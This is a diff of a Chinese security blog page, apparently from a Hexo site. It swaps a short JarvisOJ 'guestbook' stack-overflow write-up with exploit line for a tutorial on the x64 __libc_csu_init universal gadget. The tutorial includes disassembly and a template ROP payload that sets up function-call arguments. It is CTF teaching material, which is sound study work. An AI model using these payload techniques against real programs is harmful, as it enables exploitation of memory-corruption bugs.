@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ guestbook | GoldsNow</title>
+  <title>x64 之 __libc_csu_init 通用gadget | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+  <meta name="description" content="在64位ELF程序中，有一块地方很是特别，他能够帮助我们获得构造rop链的重要函数，就是__libc_csu_init，新版本的ida会直接命名为init">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ guestbook">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/index.html">
+<meta property="og:title" content="x64 之 __libc_csu_init 通用gadget">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/03/30/x64之__libc_csu_init通用gadget/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
-<meta property="og:updated_time" content="2017-03-24T02:58:51.849Z">
+<meta property="og:description" content="在64位ELF程序中，有一块地方很是特别，他能够帮助我们获得构造rop链的重要函数，就是__libc_csu_init，新版本的ida会直接命名为init">
+<meta property="og:updated_time" content="2017-03-29T18:03:19.440Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ guestbook">
-<meta name="twitter:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+<meta name="twitter:title" content="x64 之 __libc_csu_init 通用gadget">
+<meta name="twitter:description" content="在64位ELF程序中，有一块地方很是特别，他能够帮助我们获得构造rop链的重要函数，就是__libc_csu_init，新版本的ida会直接命名为init">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -220,11 +220,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]guestbook" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-x64之__libc_csu_init通用gadget" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]guestbook/" class="article-date">
-      <time datetime="2017-03-24T02:28:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/03/30/x64之__libc_csu_init通用gadget/" class="article-date">
+      <time datetime="2017-03-29T17:20:00.000Z" itemprop="datePublished">2017-03-30</time>
 </a>
     </div>
   
@@ -237,7 +237,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ guestbook
+      x64 之 __libc_csu_init 通用gadget
     </h1>
   
 
@@ -246,13 +246,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+    <a class="article-category-link" href="/categories/pwnable/">pwnable</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jarvis-oj/">Jarvis oj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gadget/">gadget</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -262,9 +262,22 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v4; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">0x14</span>uLL);</div><div class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>uLL);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以发现这里的v4只有0x88的栈空间，而可以输入的长度为0x14<br>所以存在着溢出。这个程序还有一个后面代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Fh] [bp-9h]@2</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>记录地址为<code>0x400620</code><br>所以exp为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addr_goodgame= <span class="number">0x400620</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_goodgame)</div></pre></td></tr></table></figure></p>
+        <p>在64位ELF程序中，有一块地方很是特别，他能够帮助我们获得构造rop链的重要函数，就是__libc_csu_init，新版本的ida会直接命名为init<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400700 ; void init(void)</div><div class="line">.text:0000000000400700 init            proc near               ; DATA XREF: start+16o</div><div class="line">.text:0000000000400700                 push    r15</div><div class="line">.text:0000000000400702                 mov     r15d, edi</div><div class="line">.text:0000000000400705                 push    r14</div><div class="line">.text:0000000000400707                 mov     r14, rsi</div><div class="line">.text:000000000040070A                 push    r13</div><div class="line">.text:000000000040070C                 mov     r13, rdx</div><div class="line">.text:000000000040070F                 push    r12</div><div class="line">.text:0000000000400711                 lea     r12, off_600E10</div><div class="line">.text:0000000000400718                 push    rbp</div><div class="line">.text:0000000000400719                 lea     rbp, off_600E18</div><div class="line">.text:0000000000400720                 push    rbx</div><div class="line">.text:0000000000400721                 sub     rbp, r12</div><div class="line">.text:0000000000400724                 xor     ebx, ebx</div><div class="line">.text:0000000000400726                 sar     rbp, 3</div><div class="line">.text:000000000040072A                 sub     rsp, 8</div><div class="line">.text:000000000040072E                 call    _init_proc</div><div class="line">.text:0000000000400733                 test    rbp, rbp</div><div class="line">.text:0000000000400736                 jz      short loc_400756</div><div class="line">.text:0000000000400738                 nop     dword ptr [rax+rax+00000000h]</div><div class="line">.text:0000000000400740</div><div class="line">.text:0000000000400740 loc_400740:                             ; CODE XREF: init+54j</div><div class="line">.text:0000000000400740                 mov     rdx, r13</div><div class="line">.text:0000000000400743                 mov     rsi, r14</div><div class="line">.text:0000000000400746                 mov     edi, r15d</div><div class="line">.text:0000000000400749                 call    qword ptr [r12+rbx*8]</div><div class="line">.text:000000000040074D                 add     rbx, 1</div><div class="line">.text:0000000000400751                 cmp     rbx, rbp</div><div class="line">.text:0000000000400754                 jnz     short loc_400740</div><div class="line">.text:0000000000400756</div><div class="line">.text:0000000000400756 loc_400756:                             ; CODE XREF: init+36j</div><div class="line">.text:0000000000400756                 add     rsp, 8</div><div class="line">.text:000000000040075A                 pop     rbx</div><div class="line">.text:000000000040075B                 pop     rbp</div><div class="line">.text:000000000040075C                 pop     r12</div><div class="line">.text:000000000040075E                 pop     r13</div><div class="line">.text:0000000000400760                 pop     r14</div><div class="line">.text:0000000000400762                 pop     r15</div><div class="line">.text:0000000000400764                 retn</div><div class="line">.text:0000000000400764 init            endp</div></pre></td></tr></table></figure></p>
+<p>重要的代码区域为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.text:0000000000400740                 mov     rdx, r13</div><div class="line">.text:0000000000400743                 mov     rsi, r14</div><div class="line">.text:0000000000400746                 mov     edi, r15d</div><div class="line">.text:0000000000400749                 call    qword ptr [r12+rbx*8]</div><div class="line"></div><div class="line">.text:000000000040075A                 pop     rbx</div><div class="line">.text:000000000040075B                 pop     rbp</div><div class="line">.text:000000000040075C                 pop     r12</div><div class="line">.text:000000000040075E                 pop     r13</div><div class="line">.text:0000000000400760                 pop     r14</div><div class="line">.text:0000000000400762                 pop     r15</div><div class="line">.text:0000000000400764                 retn</div></pre></td></tr></table></figure>
+<p>这里可以看到在40075A这里的代码 能可以控制rbx,rbp,r12,r13,r14和r15的值，我们需要的是 rdi,rsi,rdx,rcx,r8,r9 </p>
+<p>rdi可以通过 控制 r15 (mov edi, r15d) 来实现<br>rsi可以通过 控制 r14 (mov rsi, r14) 来实现<br>rdx可以通过 控制 r13 (mov rdx, r13) 来实现</p>
+<p>6次pop之后跳转到 400740这一个位置 然后来进行三个赋值，就可以运行一次 call r12所以这里可以直接将rbx设置为0</p>
+<p>因为是要call调用 所以这里需要got而不是plt</p>
+<p>因为这里设置了rbx为0 之后有一个(add rbx, 1) 操作，然后与 rbp比较 ，不让跳转就刚开始赋值rbp为1</p>
+<p>模版如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pop_init = <span class="number">0x40075A</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></div><div class="line">pop_init_next = <span class="number">0x400740</span> <span class="comment">#mov rdx,r13;mov rsi,r14;mov edi,r15;call [r12 + rbx*8]</span></div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'....'</span></div><div class="line">payload += p64(pop_init) <span class="comment">#goto __libc_csu_init</span></div><div class="line">payload += p64(<span class="number">0</span>)    <span class="comment">#pop rbx</span></div><div class="line">payload += p64(<span class="number">1</span>)   <span class="comment">#pop ebp</span></div><div class="line">payload += p64(got_xxx)    <span class="comment">#pop r12</span></div><div class="line">payload += p64(argv3)        <span class="comment">#pop 13 = pop rdx</span></div><div class="line">payload += p64(argv2)        <span class="comment">#pop 14 = pop rsi</span></div><div class="line">payload += p64(argv1)        <span class="comment">#pop 15 = pop rdi</span></div><div class="line">payload += p64(pop_init_next) <span class="comment">#ret</span></div><div class="line">payload += <span class="string">'\x00'</span>*<span class="number">56</span> <span class="comment"># pop 6 </span></div><div class="line">payload += p64(addr_main) <span class="comment">#ret</span></div></pre></td></tr></table></figure></p>
+<p>看了<a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="external">__libc_csu_init函数的通用gadget</a> 这篇文章之后</p>
+<p>还发现了后面还有两个小技巧</p>
+<p>就是  <code>pop rdi;ret</code> 的字节码是 <code>0x5f 0xc3</code> 而这里 <code>pop r15;retn</code>的字节码为<code>0x41 0x5f 0xc3</code></p>
+<p>这里的<code>pop_rdi_ret = 0x400763</code></p>
+<p>与此类似的是 <code>pop_rsi_r15_ret = 0x400761</code> 也是因为r14带来的</p>
+<p>这样就可以通过 <code>__libc_csu_init</code>来获得任意的 gadget 神器哇！！</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="external">__libc_csu_init函数的通用gadget</a><br><a href="http://jaq.alibaba.com/community/art/show?articleid=473" target="_blank" rel="external">一步一步学ROP之linux_x64篇</a></p>
 
       
       
@@ -274,13 +287,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]guestbook/">JarvisOJ guestbook</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/30/x64之__libc_csu_init通用gadget/">x64 之 __libc_csu_init 通用gadget</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 10时28分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 10时58分</p>
+        <p><span>发布时间:</span>2017年03月30日 - 01时20分</p>
+        <p><span>最后更新:</span>2017年03月30日 - 02时03分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]guestbook/" title="JarvisOJ guestbook">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/30/x64之__libc_csu_init通用gadget/" title="x64 之 __libc_csu_init 通用gadget">https://GoldsNow.github.io/2017/03/30/x64之__libc_csu_init通用gadget/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/30/x64之__libc_csu_init通用gadget/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -293,18 +306,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          JarvisOJ level2_x64
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/03/23/3-22 整理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF の 套路</div>
+    <a href="/2017/03/25/[JarvisOJ]level4/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JarvisOJ level4</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -315,7 +319,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章"><span class="toc-number">1.</span> <span class="toc-text">参考文章</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -366,13 +370,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="上一篇: JarvisOJ level2_x64">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/23/3-22 整理/" title="下一篇: CTF の 套路">
+            <a href="/2017/03/25/[JarvisOJ]level4/" title="下一篇: JarvisOJ level4">
                 <i class="fa fa-angle-right"></i>
             </a>
         
